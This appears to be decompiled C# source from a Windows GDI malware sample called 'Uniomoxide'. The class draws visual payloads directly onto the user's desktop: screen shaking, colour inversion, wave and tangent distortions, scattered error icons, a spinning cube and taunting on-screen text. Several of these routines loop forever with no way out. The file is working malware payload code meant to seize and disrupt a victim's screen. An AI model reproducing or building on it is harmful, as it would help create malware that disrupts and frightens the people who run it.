using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;

namespace Uniomoxide
{
	// Token: 0x02000009 RID: 9
	internal class GDI2
	{
		// Token: 0x06000018 RID: 24
		[DllImport("user32.dll")]
		public static extern IntPtr GetDC(IntPtr hWnd);

		// Token: 0x06000019 RID: 25
		[DllImport("gdi32.dll")]
		public static extern IntPtr DeleteDC(IntPtr hdc);

		// Token: 0x0600001A RID: 26
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateSolidBrush(uint color);

		// Token: 0x0600001B RID: 27
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateCompatibleDC(IntPtr hdc);

		// Token: 0x0600001C RID: 28
		[DllImport("gdi32.dll")]
		public static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int cx, int cy);

		// Token: 0x0600001D RID: 29
		[DllImport("gdi32.dll", SetLastError = true)]
		public static extern bool GdiAlphaBlend(IntPtr hdcDest, int xoriginDest, int yoriginDest, int wDest, int hDest, IntPtr hdcSrc, int xoriginSrc, int yoriginSrc, int wSrc, int hSrc, GDI2.BLENDFUNCTION ftn);

		// Token: 0x0600001E RID: 30
		[DllImport("gdi32.dll", SetLastError = true)]
		public static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, uint rop);

		// Token: 0x0600001F RID: 31
		[DllImport("user32.dll")]
		public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);

		// Token: 0x06000020 RID: 32
		[DllImport("gdi32.dll", SetLastError = true)]
		public static extern bool Rectangle(IntPtr hdc, int left, int top, int right, int bottom);

		// Token: 0x06000021 RID: 33
		[DllImport("gdi32.dll", SetLastError = true)]
		public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

		// Token: 0x06000022 RID: 34
		[DllImport("gdi32.dll", SetLastError = true)]
		public static extern IntPtr DeleteObject(IntPtr ho);

		// Token: 0x06000023 RID: 35
		[DllImport("gdi32.dll")]
		public static extern bool PatBlt(IntPtr hdc, int x, int y, int width, int height, uint rop);

		// Token: 0x06000024 RID: 36
		[DllImport("user32.dll")]
		public static extern bool EnumWindows(GDI2.EnumWindowsProc lpEnumFunc, IntPtr lParam);

		// Token: 0x06000025 RID: 37
		[DllImport("user32.dll")]
		public static extern int GetSystemMetrics(int nIndex);

		// Token: 0x06000026 RID: 38
		[DllImport("user32.dll")]
		public static extern IntPtr GetDesktopWindow();

		// Token: 0x06000027 RID: 39
		[DllImport("user32.dll")]
		public static extern IntPtr GetWindowDC(IntPtr hWnd);

		// Token: 0x06000028 RID: 40
		[DllImport("user32.dll")]
		public static extern bool ExtractIconEx(string lpszFile, int nIconIndex, out IntPtr phiconLarge, out IntPtr phiconSmall, uint nIcons);

		// Token: 0x06000029 RID: 41
		[DllImport("user32.dll")]
		public static extern IntPtr LoadIcon(IntPtr hInstance, IntPtr lpIconName);

		// Token: 0x0600002A RID: 42
		[DllImport("user32.dll")]
		public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);

		// Token: 0x0600002B RID: 43
		[DllImport("gdi32.dll", SetLastError = true)]
		public static extern bool StretchBlt(IntPtr hdcDest, int xDest, int yDest, int wDest, int hDest, IntPtr hdcSrc, int xSrc, int ySrc, int wSrc, int hSrc, uint rop);

		// Token: 0x0600002C RID: 44
		[DllImport("gdi32.dll")]
		private static extern IntPtr CreateDIBSection(IntPtr hdc, ref GDI2.BITMAPINFO pbmi, uint iUsage, out IntPtr ppvBits, IntPtr hSection, uint dwOffset);

		// Token: 0x0600002D RID: 45
		[DllImport("user32.dll")]
		public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);

		// Token: 0x0600002E RID: 46 RVA: 0x00003348 File Offset: 0x00001548
		public static uint GetRandomHEXColor()
		{
			byte b = (byte)GDI2.rand.Next(255);
			byte b2 = (byte)GDI2.rand.Next(255);
			byte b3 = (byte)GDI2.rand.Next(255);
			return (uint)(((int)b << 16) | ((int)b2 << 8) | (int)b3);
		}

		// Token: 0x0600002F RID: 47 RVA: 0x00003394 File Offset: 0x00001594
		public static void SRCANDBlack()
		{
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
			while (DateTime.Now - now < timeSpan)
			{
				IntPtr dc = GDI2.GetDC(GDI2.NULL);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				int num = GDI2.rand.Next(-5, 5);
				int num2 = GDI2.rand.Next(-5, 5);
				GDI2.BitBlt(dc, num, num2, systemMetrics, systemMetrics2, dc, 0, 0, 13369376U);
				Thread.Sleep(5);
			}
		}

		// Token: 0x06000030 RID: 48 RVA: 0x00003420 File Offset: 0x00001620
		public static void scrolling()
		{
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
			while (DateTime.Now - now < timeSpan)
			{
				IntPtr dc = GDI2.GetDC(IntPtr.Zero);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				IntPtr intPtr = GDI2.CreateCompatibleDC(dc);
				IntPtr intPtr2 = GDI2.CreateCompatibleBitmap(dc, systemMetrics, systemMetrics2);
				GDI2.SelectObject(intPtr, intPtr2);
				GDI2.BitBlt(dc, 0, 0, systemMetrics, systemMetrics2, dc, 0, 0, 13369376U);
				GDI2.BitBlt(intPtr, 0, 0, systemMetrics, systemMetrics2, dc, 0, 0, 13369376U);
				GDI2.StretchBlt(dc, 0, 0, systemMetrics, systemMetrics2, intPtr, systemMetrics / 4, systemMetrics2 / 4, systemMetrics / 2, systemMetrics2 / 2, 13369376U);
			}
		}

		// Token: 0x06000031 RID: 49 RVA: 0x000034E0 File Offset: 0x000016E0
		public static void TRODI()
		{
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = TimeSpan.FromSeconds(90.0);
			while (DateTime.Now - now < timeSpan)
			{
				IntPtr dc = GDI2.GetDC(IntPtr.Zero);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				double num = 0.0;
				while (DateTime.Now - now < timeSpan)
				{
					double num2 = num;
					for (int i = 0; i < systemMetrics2; i++)
					{
						int num3 = (int)(Math.Sin(num2) * 30.0);
						GDI2.BitBlt(dc, 0, i, systemMetrics, 1, dc, num3, i, 13369376U);
						num2 += 0.1;
					}
					num += 0.15;
					Thread.Sleep(1);
				}
			}
		}

		// Token: 0x06000032 RID: 50 RVA: 0x000035BC File Offset: 0x000017BC
		public static void DrawLOLZ()
		{
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = TimeSpan.FromSeconds(60.0);
			while (DateTime.Now - now < timeSpan)
			{
				IntPtr dc = GDI2.GetDC(IntPtr.Zero);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				int num = GDI2.rand.Next(0, systemMetrics - 32);
				int num2 = GDI2.rand.Next(0, systemMetrics2 - 32);
				IntPtr intPtr = GDI2.LoadIcon(IntPtr.Zero, new IntPtr(32513));
				GDI2.DrawIcon(dc, num, num2, intPtr);
				Thread.Sleep(1);
			}
		}

		// Token: 0x06000033 RID: 51 RVA: 0x0000365C File Offset: 0x0000185C
		public static void InvertColor()
		{
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = TimeSpan.FromSeconds(60.0);
			while (DateTime.Now - now < timeSpan)
			{
				IntPtr dc = GDI2.GetDC(IntPtr.Zero);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				GDI2.BitBlt(dc, 0, 0, systemMetrics, systemMetrics2, dc, 0, 0, 5570569U);
				Thread.Sleep(5);
			}
		}

		// Token: 0x06000034 RID: 52 RVA: 0x000036C8 File Offset: 0x000018C8
		public static void SRCANDBlack2()
		{
			for (;;)
			{
				IntPtr dc = GDI2.GetDC(GDI2.NULL);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				int num = GDI2.rand.Next(-5, 5);
				int num2 = GDI2.rand.Next(-5, 5);
				GDI2.BitBlt(dc, num, num2, systemMetrics, systemMetrics2, dc, 0, 0, 13369376U);
				Thread.Sleep(5);
			}
		}

		// Token: 0x06000035 RID: 53 RVA: 0x00003728 File Offset: 0x00001928
		public static void textgdi()
		{
			IntPtr dc = GDI2.GetDC(IntPtr.Zero);
			Graphics graphics = Graphics.FromHdc(dc);
			graphics.SmoothingMode = SmoothingMode.AntiAlias;
			string[] array = new string[] { "you shouldve have done that...", "Uniomoxide.exe", "x0rUnrespond2", "your fucked up", "T.E.R.A" };
			Color[] array2 = new Color[]
			{
				Color.Red,
				Color.Green,
				Color.Blue,
				Color.Magenta,
				Color.Cyan
			};
			float[] array3 = new float[] { -30f, 15f, 45f, -60f, 75f };
			int width = Screen.PrimaryScreen.Bounds.Width;
			int height = Screen.PrimaryScreen.Bounds.Height;
			for (;;)
			{
				for (int i = 0; i < 5; i++)
				{
					using (Font font = new Font("Arial", 67f, FontStyle.Bold | FontStyle.Underline))
					{
						using (Brush brush = new SolidBrush(array2[i]))
						{
							graphics.ResetTransform();
							int num = GDI2.rnd.Next(0, width);
							int num2 = GDI2.rnd.Next(0, height);
							graphics.TranslateTransform((float)num, (float)num2);
							graphics.RotateTransform(array3[i]);
							graphics.ScaleTransform(2f, 1f);
							graphics.DrawString(array[i], font, brush, 0f, 0f);
						}
					}
				}
				Thread.Sleep(100);
			}
		}

		// Token: 0x06000036 RID: 54 RVA: 0x000038DC File Offset: 0x00001ADC
		public static void dejato()
		{
			for (;;)
			{
				IntPtr dc = GDI2.GetDC(IntPtr.Zero);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				double num = 0.0;
				double num2 = num;
				for (int i = 0; i < systemMetrics2; i++)
				{
					int num3 = (int)(Math.Tan(num2) * 1.0);
					GDI2.BitBlt(dc, 0, i, systemMetrics, 1, dc, num3, i, 13369376U);
					num2 += 0.01;
				}
				num += 0.15;
				Thread.Sleep(1);
			}
		}

		// Token: 0x06000037 RID: 55 RVA: 0x00003970 File Offset: 0x00001B70
		public static void CUBE()
		{
			float num = 0f;
			float num2 = 0f;
			float num3 = 0f;
			PointF[] array = new PointF[8];
			DateTime now = DateTime.Now;
			TimeSpan timeSpan = TimeSpan.FromSeconds(30.0);
			while (DateTime.Now - now < timeSpan)
			{
				IntPtr dc = GDI2.GetDC(IntPtr.Zero);
				int systemMetrics = GDI2.GetSystemMetrics(0);
				int systemMetrics2 = GDI2.GetSystemMetrics(1);
				using (Graphics graphics = Graphics.FromHdc(dc))
				{
					float num4 = 80f;
					float[,] array2 = new float[8, 3];
					array2[0, 0] = -80f;
					array2[0, 1] = -80f;
					array2[0, 2] = -80f;
					array2[1, 0] = num4;
					array2[1, 1] = -80f;
					array2[1, 2] = -80f;
					array2[2, 0] = num4;
					array2[2, 1] = num4;
					array2[2, 2] = -80f;
					array2[3, 0] = -80f;
					array2[3, 1] = num4;
					array2[3, 2] = -80f;
					array2[4, 0] = -80f;
					array2[4, 1] = -80f;
					array2[4, 2] = num4;
					array2[5, 0] = num4;
					array2[5, 1] = -80f;
					array2[5, 2] = num4;
					array2[6, 0] = num4;
					array2[6, 1] = num4;
					array2[6, 2] = num4;
					array2[7, 0] = -80f;
					array2[7, 1] = num4;
					array2[7, 2] = num4;
					float[,] array3 = array2;
					num += 0.03f;
					num2 += 0.02f;
					num3 += 0.04f;
					float num5 = (float)(Math.Sin((double)num) * 150.0);
					float num6 = (float)(Math.Cos((double)num2) * 150.0);
					for (int i = 0; i < 8; i++)
					{
						float num7 = array3[i, 0];
						float num8 = array3[i, 1];
						float num9 = array3[i, 2];
						float num10 = (float)((double)num8 * Math.Cos((double)num) - (double)num9 * Math.Sin((double)num));
						float num11 = (float)((double)num8 * Math.Sin((double)num) + (double)num9 * Math.Cos((double)num));
						float num12 = num7;
						float num13 = (float)((double)num12 * Math.Cos((double)num2) + (double)num11 * Math.Sin((double)num2));
						float num14 = num10;
						float num15 = (float)((double)(-(double)num12) * Math.Sin((double)num2) + (double)num11 * Math.Cos((double)num2));
						float num16 = (float)((double)num13 * Math.Cos((double)num3) - (double)num14 * Math.Sin((double)num3));
						float num17 = (float)((double)num13 * Math.Sin((double)num3) + (double)num14 * Math.Cos((double)num3));
						float num18 = num15;
						float num19 = 300f / (300f + num18);
						array[i] = new PointF((float)(systemMetrics / 2) + num16 * num19 + num5, (float)(systemMetrics2 / 2) + num17 * num19 + num6);
					}
					int[][] array4 = new int[12][];
					array4[0] = new int[] { 0, 1 };
					array4[1] = new int[] { 1, 2 };
					array4[2] = new int[] { 2, 3 };
					int num20 = 3;
					int[] array5 = new int[2];
					array5[0] = 3;
					array4[num20] = array5;
					array4[4] = new int[] { 4, 5 };
					array4[5] = new int[] { 5, 6 };
					array4[6] = new int[] { 6, 7 };
					array4[7] = new int[] { 7, 4 };
					array4[8] = new int[] { 0, 4 };
					array4[9] = new int[] { 1, 5 };
					array4[10] = new int[] { 2, 6 };
					array4[11] = new int[] { 3, 7 };
					int[][] array6 = array4;
					using (Pen pen = new Pen(Color.Cyan, 2f))
					{
						foreach (int[] array8 in array6)
						{
							graphics.DrawLine(pen, array[array8[0]], array[array8[1]]);
						}
					}
				}
				GDI2.ReleaseDC(IntPtr.Zero, dc);
			}
		}

		// Token: 0x06000038 RID: 56 RVA: 0x00003DF8 File Offset: 0x00001FF8
		public static void hi()
		{
			IntPtr dc = GDI2.GetDC(IntPtr.Zero);
			int systemMetrics = GDI2.GetSystemMetrics(0);
			int systemMetrics2 = GDI2.GetSystemMetrics(1);
			IntPtr intPtr = GDI2.CreateCompatibleDC(dc);
			GDI2.BITMAPINFO bitmapinfo = default(GDI2.BITMAPINFO);
			bitmapinfo.bmiColors = new uint[256];
			bitmapinfo.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
			bitmapinfo.bmiHeader.biWidth = systemMetrics;
			bitmapinfo.bmiHeader.biHeight = -systemMetrics2;
			bitmapinfo.bmiHeader.biPlanes = 1;
			bitmapinfo.bmiHeader.biBitCount = 32;
			bitmapinfo.bmiHeader.biCompression = 0U;
			IntPtr intPtr3;
			IntPtr intPtr2 = GDI2.CreateDIBSection(dc, ref bitmapinfo, 0U, out intPtr3, IntPtr.Zero, 0U);
			GDI2.SelectObject(intPtr, intPtr2);
			GDI2.BitBlt(intPtr, 0, 0, systemMetrics, systemMetrics2, dc, 0, 0, 13369376U);
			double num = 0.0;
			for (;;)
			{
				num += 0.3;
				for (int i = 0; i < systemMetrics; i++)
				{
					double num2 = Math.Tan(num + (double)i * 0.009) * 32.0;
					GDI2.BitBlt(dc, i, (int)num2, 1, systemMetrics2, intPtr, i, 0, 13369376U);
				}
				Thread.Sleep(1);
			}
		}

		// Token: 0x0400001B RID: 27
		public const uint SRCCOPY = 13369376U;

		// Token: 0x0400001C RID: 28
		public const uint SRCPAINT = 15597702U;

		// Token: 0x0400001D RID: 29
		public const uint SRCAND = 8913094U;

		// Token: 0x0400001E RID: 30
		public const uint SRCINVERT = 6684742U;

		// Token: 0x0400001F RID: 31
		public const uint SRCERASE = 4457256U;

		// Token: 0x04000020 RID: 32
		public const uint NOTSRCCOPY = 3342344U;

		// Token: 0x04000021 RID: 33
		public const uint NOTSRCERASE = 1114278U;

		// Token: 0x04000022 RID: 34
		public const uint MERGECOPY = 12583114U;

		// Token: 0x04000023 RID: 35
		public const uint MERGEPAINT = 12255782U;

		// Token: 0x04000024 RID: 36
		public const uint PATCOPY = 15728673U;

		// Token: 0x04000025 RID: 37
		public const uint PATPAINT = 16452105U;

		// Token: 0x04000026 RID: 38
		public const uint PATINVERT = 5898313U;

		// Token: 0x04000027 RID: 39
		public const uint DSTINVERT = 5570569U;

		// Token: 0x04000028 RID: 40
		public const uint BLACKNESS = 66U;

		// Token: 0x04000029 RID: 41
		public const uint WHITENESS = 16711778U;

		// Token: 0x0400002A RID: 42
		public const uint CAPTUREBLT = 1073741824U;

		// Token: 0x0400002B RID: 43
		public const uint CUSTOM = 1051781U;

		// Token: 0x0400002C RID: 44
		private static readonly IntPtr NULL;

		// Token: 0x0400002D RID: 45
		private static Random rnd = new Random();

		// Token: 0x0400002E RID: 46
		public static Random rand = new Random();

		// Token: 0x02000012 RID: 18
		// (Invoke) Token: 0x06000095 RID: 149
		public delegate bool EnumWindowsProc(IntPtr hwnd, IntPtr lParam);

		// Token: 0x02000013 RID: 19
		public struct BLENDFUNCTION
		{
			// Token: 0x06000098 RID: 152 RVA: 0x0000245D File Offset: 0x0000065D
			public BLENDFUNCTION(byte op, byte flags, byte alpha, byte format)
			{
				this.BlendOp = op;
				this.BlendFlags = flags;
				this.SourceConstantAlpha = alpha;
				this.AlphaFormat = format;
			}

			// Token: 0x04000071 RID: 113
			private byte BlendOp;

			// Token: 0x04000072 RID: 114
			private byte BlendFlags;

			// Token: 0x04000073 RID: 115
			private byte SourceConstantAlpha;

			// Token: 0x04000074 RID: 116
			private byte AlphaFormat;
		}

		// Token: 0x02000014 RID: 20
		public struct POINT
		{
			// Token: 0x06000099 RID: 153 RVA: 0x0000247C File Offset: 0x0000067C
			public POINT(int x, int y)
			{
				this.X = x;
				this.Y = y;
			}

			// Token: 0x0600009A RID: 154 RVA: 0x00004B5C File Offset: 0x00002D5C
			public static implicit operator Point(GDI2.POINT p)
			{
				return new Point(p.X, p.Y);
			}

			// Token: 0x0600009B RID: 155 RVA: 0x00004B7C File Offset: 0x00002D7C
			public static implicit operator GDI2.POINT(Point p)
			{
				return new GDI2.POINT(p.X, p.Y);
			}

			// Token: 0x04000075 RID: 117
			public int X;

			// Token: 0x04000076 RID: 118
			public int Y;
		}

		// Token: 0x02000015 RID: 21
		private struct BITMAPINFO
		{
			// Token: 0x04000077 RID: 119
			public BITMAPINFOHEADER bmiHeader;

			// Token: 0x04000078 RID: 120
			[MarshalAs(UnmanagedType.ByValArray, SizeConst = 256)]
			public uint[] bmiColors;
		}
	}
}
